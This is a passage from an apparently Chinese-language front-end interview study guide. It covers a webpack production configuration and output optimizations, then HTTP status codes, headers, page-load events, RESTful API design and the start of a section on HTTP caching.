<span class="token keyword">const</span> webpackCommonConf <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./webpack.common.js'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> srcPath<span class="token punctuation">,</span> distPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./paths'</span><span class="token punctuation">)</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">smart</span><span class="token punctuation">(</span>webpackCommonConf<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'production'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token comment">// filename: 'bundle.[contentHash:8].js',  // 打包代码时，加上 hash 戳</span>
        <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'[name].[contentHash:8].js'</span><span class="token punctuation">,</span> <span class="token comment">// name 即多入口时 entry 的 key</span>
        <span class="token literal-property property">path</span><span class="token operator">:</span> distPath<span class="token punctuation">,</span>
        <span class="token comment">// publicPath: 'http://cdn.abc.com'  // 修改所有静态文件 url 的前缀（如 cdn 域名），这里暂时用不到</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token comment">// js</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token comment">// 把对 .js 文件的处理转交给 id 为 babel 的 HappyPack 实例</span>
                <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'happypack/loader?id=babel'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token literal-property property">include</span><span class="token operator">:</span> srcPath<span class="token punctuation">,</span>
                <span class="token comment">// exclude: /node_modules/</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">// 图片 - 考虑 base64 编码的情况</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(png|jpg|jpeg|gif)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">options</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token comment">// 小于 5kb 的图片用 base64 格式产出</span>
                        <span class="token comment">// 否则，依然延用 file-loader 的形式，产出 url 格式</span>
                        <span class="token literal-property property">limit</span><span class="token operator">:</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">,</span>

                        <span class="token comment">// 打包到 img 目录下</span>
                        <span class="token literal-property property">outputPath</span><span class="token operator">:</span> <span class="token string">'/img1/'</span><span class="token punctuation">,</span>

                        <span class="token comment">// 设置图片的 cdn 地址（也可以统一在外面的 output 中设置，那将作用于所有静态资源）</span>
                        <span class="token comment">// publicPath: 'http://cdn.abc.com'</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">// 抽离 css</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.css$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                    MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span>  <span class="token comment">// 注意，这里不再用 style-loader</span>
                    <span class="token string">'css-loader'</span><span class="token punctuation">,</span>
                    <span class="token string">'postcss-loader'</span>
                <span class="token punctuation">]</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token comment">// 抽离 less</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.less$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                    MiniCssExtractPlugin<span class="token punctuation">.</span>loader<span class="token punctuation">,</span>  <span class="token comment">// 注意，这里不再用 style-loader</span>
                    <span class="token string">'css-loader'</span><span class="token punctuation">,</span>
                    <span class="token string">'less-loader'</span><span class="token punctuation">,</span>
                    <span class="token string">'postcss-loader'</span>
                <span class="token punctuation">]</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">plugins</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">CleanWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 会默认清空 output.path 文件夹</span>
        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>DefinePlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// window.ENV = 'production'</span>
            <span class="token constant">ENV</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'production'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

        <span class="token comment">// 抽离 css 文件</span>
        <span class="token keyword">new</span> <span class="token class-name">MiniCssExtractPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'css/main.[contentHash:8].css'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

        <span class="token comment">// 忽略 moment 下的 /locale 目录</span>
        <span class="token keyword">new</span> <span class="token class-name">webpack<span class="token punctuation">.</span>IgnorePlugin</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\/locale</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">moment</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>

        <span class="token comment">// happyPack 开启多进程打包</span>
        <span class="token keyword">new</span> <span class="token class-name">HappyPack</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// 用唯一的标识符 id 来代表当前的 HappyPack 是用来处理一类特定的文件</span>
            <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'babel'</span><span class="token punctuation">,</span>
            <span class="token comment">// 如何处理 .js 文件，用法和 Loader 配置中一样</span>
            <span class="token literal-property property">loaders</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'babel-loader?cacheDirectory'</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

        <span class="token comment">// 使用 ParallelUglifyPlugin 并行压缩输出的 JS 代码</span>
        <span class="token keyword">new</span> <span class="token class-name">ParallelUglifyPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token comment">// 传递给 UglifyJS 的参数</span>
            <span class="token comment">// （还是使用 UglifyJS 压缩，只不过帮助开启了多进程）</span>
            <span class="token literal-property property">uglifyJS</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">beautify</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 最紧凑的输出</span>
                    <span class="token literal-property property">comments</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 删除所有的注释</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token literal-property property">compress</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 删除所有的 `console` 语句，可以兼容ie浏览器</span>
                    <span class="token literal-property property">drop_console</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    <span class="token comment">// 内嵌定义了但是只用到一次的变量</span>
                    <span class="token literal-property property">collapse_vars</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                    <span class="token comment">// 提取出出现多次但是没有定义成变量去引用的静态值</span>
                    <span class="token literal-property property">reduce_vars</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>

    <span class="token literal-property property">optimization</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token comment">// 压缩 css</span>
        <span class="token literal-property property">minimizer</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">TerserJSPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">OptimizeCSSAssetsPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

        <span class="token comment">// 分割代码块</span>
        <span class="token literal-property property">splitChunks</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">chunks</span><span class="token operator">:</span> <span class="token string">'all'</span><span class="token punctuation">,</span>
            <span class="token comment">/**
             * initial 入口chunk，对于异步导入的文件不处理
                async 异步chunk，只对异步导入的文件处理
                all 全部chunk
             */</span>

            <span class="token comment">// 缓存分组</span>
            <span class="token literal-property property">cacheGroups</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token comment">// 第三方模块</span>
                <span class="token literal-property property">vendor</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'vendor'</span><span class="token punctuation">,</span> <span class="token comment">// chunk 名称</span>
                    <span class="token literal-property property">priority</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 权限更高，优先抽离，重要！！！</span>
                    <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">node_modules</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
                    <span class="token literal-property property">minSize</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token comment">// 大小限制</span>
                    <span class="token literal-property property">minChunks</span><span class="token operator">:</span> <span class="token number">1</span>  <span class="token comment">// 最少复用过几次</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>

                <span class="token comment">// 公共的模块</span>
                <span class="token literal-property property">common</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'common'</span><span class="token punctuation">,</span> <span class="token comment">// chunk 名称</span>
                    <span class="token literal-property property">priority</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 优先级</span>
                    <span class="token literal-property property">minSize</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token comment">// 公共模块的大小限制</span>
                    <span class="token literal-property property">minChunks</span><span class="token operator">:</span> <span class="token number">2</span>  <span class="token comment">// 公共模块最少复用过几次</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="webpack性能优化-产出代码-线上运行"><a href="#webpack性能优化-产出代码-线上运行" class="header-anchor">#</a> webpack性能优化-产出代码（线上运行）</h3> <p><strong>前言</strong></p> <ul><li>体积更小</li> <li>合理分包，不重复加载</li> <li>速度更快、内存使用更少</li></ul> <p><strong>产出代码优化</strong></p> <ul><li>小图片<code>base64</code>编码，减少<code>http</code>请求</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 图片 - 考虑 base64 编码的情况</span>
<span class="token literal-property property">module</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">rules</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token literal-property property">test</span><span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(png|jpg|jpeg|gif)$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
            <span class="token literal-property property">use</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span>
                <span class="token literal-property property">options</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token comment">// 小于 5kb 的图片用 base64 格式产出</span>
                    <span class="token comment">// 否则，依然延用 file-loader 的形式，产出 url 格式</span>
                    <span class="token literal-property property">limit</span><span class="token operator">:</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">,</span>

                    <span class="token comment">// 打包到 img 目录下</span>
                    <span class="token literal-property property">outputPath</span><span class="token operator">:</span> <span class="token string">'/img1/'</span><span class="token punctuation">,</span>

                    <span class="token comment">// 设置图片的 cdn 地址（也可以统一在外面的 output 中设置，那将作用于所有静态资源）</span>
                    <span class="token comment">// publicPath: 'http://cdn.abc.com'</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li><code>bundle</code>加<code>contenthash</code>，有利于浏览器缓存</li> <li>懒加载<code>import()</code>语法，减少首屏加载时间</li> <li>提取公共代码（第三方代码<code>Vue</code>、<code>React</code>、<code>loadash</code>等）没有必要多次打包，可以提取到<code>vendor</code>中</li> <li><code>IgnorePlugin</code>忽略不需要的包（如<code>moment</code>多语言），减少打包的代码</li> <li>使用<code>CDN</code>加速，减少资源加载时间<div class="language-js extra-class"><pre class="language-js"><code><span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">filename</span><span class="token operator">:</span> <span class="token string">'[name].[contentHash:8].js'</span><span class="token punctuation">,</span> <span class="token comment">// name 即多入口时 entry 的 key</span>
  <span class="token literal-property property">path</span><span class="token operator">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token comment">// 修改所有静态文件 url 的前缀（如 cdn 域名）</span>
  <span class="token comment">// 这样index.html中引入的js、css、图片等资源都会加上这个前缀</span>
  <span class="token literal-property property">publicPath</span><span class="token operator">:</span> <span class="token string">'http://cdn.abc.com'</span>  
<span class="token punctuation">}</span><span class="token punctuation">,</span>
</code></pre></div></li> <li><code>webpack</code>使用<code>production</code>模式，<code>mode: 'production'</code> <ul><li>自动压缩代码</li> <li>启动<code>Tree Shaking</code> <ul><li><code>ES6</code>模块化，<code>import</code>和<code>export</code>，<code>webpack</code>会自动识别，才会生效</li> <li><code>Commonjs</code>模块化，<code>require</code>和<code>module.exports</code>，<code>webpack</code>无法识别，不会生效</li> <li><strong>ES6模块和Commonjs模块区别</strong> <ul><li><code>ES6</code>模块是静态引入，编译时引入</li> <li><code>Commonjs</code>是动态引入，执行时引入</li> <li>只有<code>ES6 Module</code>才能静态分析，实现<code>Tree Shaking</code> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/8c992a059adfd272.png" loading="lazy" class="lazy"></li></ul></li></ul></li></ul></li> <li><code>Scope Hoisting</code>：是<code>webpack3</code>引入的一个新特性，它会分析出模块之间的依赖关系，尽可能地把打散的模块合并到一个函数中去，减少代码间的引用，从而减少代码体积
<ul><li>减少代码体积</li> <li>创建函数作用域更少</li> <li>代码可读性更好
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/4312a5cf7761b232.png" loading="lazy" class="lazy"></li></ul></li></ul> <h2 id="_9-http"><a href="#_9-http" class="header-anchor">#</a> 9 HTTP</h2> <h3 id="http基础总结"><a href="#http基础总结" class="header-anchor">#</a> HTTP基础总结</h3> <p><strong>HTTP状态码</strong></p> <ul><li><code>1XX</code>：信息状态码
<ul><li><code>100 Continue</code>   继续，一般在发送<code>post</code>请求时，已发送了<code>http header</code>之后服务端将返回此信息，表示确认，之后发送具体参数信息</li></ul></li> <li><code>2XX</code>：成功状态码
<ul><li><code>200 OK</code>         正常返回信息</li> <li><code>201 Created</code>   请求成功并且服务器创建了新的资源</li> <li><code>202 Accepted</code>   服务器已接受请求，但尚未处理</li></ul></li> <li><code>3XX</code>：重定向
<ul><li><code>301 Moved Permanently</code>  请求的网页已永久移动到新位置。</li> <li><code>302 Found</code>     临时性重定向。</li> <li><code>303 See Other</code>  临时性重定向，且总是使用 <code>GET</code> 请求新的 <code>URI</code>。</li> <li><code>304 Not Modified</code> 自从上次请求后，请求的网页未修改过。</li></ul></li> <li><code>4XX</code>：客户端错误
<ul><li><code>400 Bad Request</code> 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。</li> <li><code>401 Unauthorized</code> 请求未授权。</li> <li><code>403 Forbidden</code>  禁止访问。</li> <li><code>404 Not Found</code>   找不到如何与 <code>URI</code> 相匹配的资源。</li></ul></li> <li><code>5XX:</code> 服务器错误
<ul><li><code>500 Internal Server Error</code>  最常见的服务器端错误。</li> <li><code>503 Service Unavailable</code> 服务器端暂时无法处理请求（可能是过载或维护）。</li></ul></li></ul> <p><strong>常见状态码</strong></p> <ul><li><code>200</code> 成功</li> <li><code>301</code> 永久重定向（配合<code>location</code>，浏览器自动处理）</li> <li><code>302</code> 临时重定向（配合<code>location</code>，浏览器自动处理）</li> <li><code>304</code> 资源未被修改</li> <li><code>403</code> 没有权限访问，一般做权限角色</li> <li><code>404</code> 资源未找到</li> <li><code>500</code> <code>Internal Server Error</code>服务器内部错误</li> <li><code>502</code> <code>Bad Gateway</code></li> <li><code>503</code> <code>Service Unavailable</code></li> <li><code>504</code> <code>Gateway Timeout</code>网关超时</li></ul> <p><strong>502 与 504 的区别</strong></p> <p>这两种异常状态码都与网关 <code>Gateway</code> 有关，首先明确两个概念</p> <ul><li><code>Proxy (Gateway)</code>，反向代理层或者网关层。在公司级应用中一般使用 <code>Nginx</code> 扮演这个角色</li> <li><code>Application (Upstream server)</code>，应用层服务，作为 <code>Proxy</code> 层的上游服务。在公司中一般为各种语言编写的服务器应用，如 <code>Go/Java/Python/PHP/Node</code> 等</li> <li><strong>此时关于 502 与 504 的区别就很显而易见</strong> <ul><li><code>502 Bad Gateway</code>：一般表现为你自己写的「应用层服务(<code>Java/Go/PHP</code>)挂了」，或者网关指定的上游服务直接指错了地址，网关层无法接收到响应</li> <li><code>504 Gateway Timeout</code>：一般表现为「应用层服务 (<code>Upstream</code>) 超时，超过了 <code>Gatway</code> 配置的 <code>Timeout</code>」，如查库操作耗时三分钟，超过了 <code>Nginx</code> 配置的超时时间</li></ul></li></ul> <p><strong>http headers</strong></p> <ul><li><strong>常见的Request Headers</strong> <ul><li><code>Accept</code> 浏览器可接收的数据格式</li> <li><code>Accept-Enconding</code> 浏览器可接收的压缩算法，如<code>gzip</code></li> <li><code>Accept-Language</code> 浏览器可接收的语言，如<code>zh-CN</code></li> <li><code>Connection:keep-alive</code> 一次<code>TCP</code>连接重复复用</li> <li><code>Cookie</code></li> <li><code>Host</code> 请求的域名是什么</li> <li><code>User-Agent</code>（简称<code>UA</code>） 浏览器信息</li> <li><code>Content-type</code> 发送数据的格式，如<code>application/json</code></li></ul></li> <li><strong>常见的Response Headers</strong> <ul><li><code>Content-type</code> 返回数据的格式，如<code>application/json</code></li> <li><code>Content-length</code> 返回数据的大小，多少字节</li> <li><code>Content-Encoding</code> 返回数据的压缩算法，如<code>gzip</code></li> <li><code>set-cookie</code></li></ul></li> <li><strong>缓存相关的Headers</strong> <ul><li><code>Cache Control</code>、<code>Expired</code></li> <li><code>Last-Modified</code>、<code>If-Modified-Since</code></li> <li><code>Etag</code>、<code>If-None-Match</code></li></ul></li></ul> <p><strong>从输入URL到显示出页面的整个过程</strong></p> <ul><li><strong>下载资源</strong>：各个资源类型，下载过程</li> <li><strong>加载过程</strong> <ul><li><code>DNS</code>解析：域名 =&gt; <code>IP</code>地址</li> <li>浏览器根据<code>IP</code>地址向服务器发起<code>HTTP</code>请求</li> <li>服务器处理<code>HTTP</code>请求，并返回浏览器</li></ul></li> <li><strong>渲染过程</strong> <ul><li>根据<code>HTML</code>生成<code>DOM Tree</code></li> <li>根据<code>CSS</code>生成<code>CSSOM</code></li> <li><code>DOM Tree</code>和<code>CSSOM</code>整合形成<code>Render Tree</code>，根据<code>Render Tree</code>渲染页面</li> <li>遇到<code>&lt;script&gt;</code>暂停渲染，优先加载并执行<code>JS</code>代码，执行完在解析渲染（JS线程和渲染线程共用一个线程，JS执行要暂停DOM渲染）</li> <li>直至把<code>Render Tree</code>渲染完成</li></ul></li></ul> <p><strong>window.onload和DOMContentLoaded</strong></p> <ul><li><code>window.onload</code> 页面的全部资源加载完才会执行，包括图片、视频等</li> <li><code>DOMContentLoaded</code> 渲染完即可，图片可能尚未下载</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 页面的全部资源加载完才会执行，包括图片、视频等</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// DOM渲染完才执行，此时图片、视频等可能还没有加载完</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>演示</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>一段文字 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>一段文字 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>一段文字 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span>
    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>img1<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1570191150419&amp;di=37b1892665fc74806306ce7f9c3f1971&amp;imgtype=0&amp;src=http%3A%2F%2Fimg.pconline.com.cn%2Fimages%2Fupload%2Fupc%2Ftx%2Fitbbs%2F1411%2F13%2Fc14%2F26229_1415883419758.jpg<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">/&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> img1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'img1'</span><span class="token punctuation">)</span>
  img1<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'img loaded'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'window loaded'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'dom content loaded'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>

  <span class="token comment">// 结果</span>
  <span class="token comment">// dom content loaded</span>
  <span class="token comment">// img loaded</span>
  <span class="token comment">// window loaded</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>拓展：关于Restful API</strong></p> <ul><li>一种新的<code>API</code>设计方法</li> <li>传统<code>API</code>设计：把每个<code>url</code>当做一个功能</li> <li><code>Restful API</code>设计：把每个<code>url</code>当前一个唯一的资源
<ul><li><strong>如何设计成一个资源</strong> <ul><li>尽量不用<code>url</code>参数
<ul><li>传统<code>API</code>设计：<code>/api/list?pageIndex=2</code></li> <li><code>Restful API</code>设计：<code>/api/list/2</code></li></ul></li> <li>用<code>method</code>表示操作类型
<ul><li>传统<code>API</code>设计：
<ul><li><code>post</code>新增请求：<code>/api/create-blog</code></li> <li><code>post</code>更新请求：<code>/api/update-blog?id=100</code></li> <li><code>post</code>删除请求：<code>/api/delete-blog?id=100</code></li> <li><code>get</code>请求：<code>/api/get-blog?id=100</code></li></ul></li> <li><code>Restful API</code>设计：
<ul><li><code>post</code>新增请求：<code>/api/blog</code></li> <li><code>patch</code>更新请求：<code>/api/blog/100</code></li> <li><code>delete</code>删除请求：<code>/api/blog/100</code></li> <li><code>get</code>请求：<code>/api/blog/100</code></li></ul></li></ul></li></ul></li></ul></li></ul> <h3 id="http缓存"><a href="#http缓存" class="header-anchor">#</a> HTTP缓存</h3> <ul><li><strong>关于缓存介绍</strong> <ul><li>为什么需要缓存？减少网络请求（网络请求不稳定性），让页面渲染更快</li> <li>哪些资源可以被缓存？静态资源（<code>js</code> <code>css</code> <code>img</code>）<code>webpack</code>打包加<code>contenthash</code>根据内容生成<code>hash</code></li></ul></li> <li><strong>http缓存策略</strong>（强制缓存 + 协商缓存）
<ul><li><strong>强制缓存</strong> <ul><li>服务端在<code>Response Headers</code>中返回给客户端</li> <li><code>Cache-Control</code>：<code>max-age=31536000</code>（单位：秒）一年</li> <li><strong>Cache-Control的值</strong> <ul><li><code>max-age</code>（常用）缓存的内容将在<code>max-age</code>秒后失效</li> <li><code>no-cache</code>（常用）不要本地强制缓存，正常向服务端请求（只要服务端最新的内容）。需要使用协商缓存来验证缓存数据（<code>Etag</code> <code>Last-Modified</code>）</li> <li><code>no-store</code> 不要本地强制缓存，也不要服务端做缓存，所有内容都不会缓存，强制缓存和协商缓存都不会触发</li> <li><code>public</code> 所有内容都将被缓存（客户端和代理服务器都可缓存）</li> <li><code>private</code> 所有内容只有客户端可以缓存</li></ul></li> <li><strong>Expires</strong> <ul><li><code>Expires</code>：<code>Thu, 31 Dec 2037 23:55:55 GMT</code>（过期时间）</li> <li>已被<code>Cache-Control</code>代替</li></ul></li> <li><strong>Expires和Cache-Control的区别</strong> <ul><li><code>Expires</code>是<code>HTTP1.0</code>的产物，<code>Cache-Control</code>是<code>HTTP1.1</code>的产物</li> <li><code>Expires</code>是服务器返回的具体过期时间，<code>Cache-Control</code>是相对时间</li> <li><code>Expires</code>存在兼容性问题，<code>Cache-Control</code>优先级更高</li></ul></li> <li><strong>强制缓存的优先级高于协商缓存</strong></li> <li><strong>强制缓存的流程</strong> <ul><li>浏览器第一次请求资源，服务器返回资源和<code>Cache-Control</code> <code>Expires</code></li> <li>浏览器第二次请求资源，会带上<code>Cache-Control</code> <code>Expires</code>，服务器根据这两个值判断是否命中强制缓存</li> <li>命中强制缓存，直接从缓存中读取资源，返回给浏览器</li> <li>未命中强制缓存，会带上<code>If-Modified-Since</code> <code>If-None-Match</code>，服务器根据这两个值判断是否命中协商缓存</li> 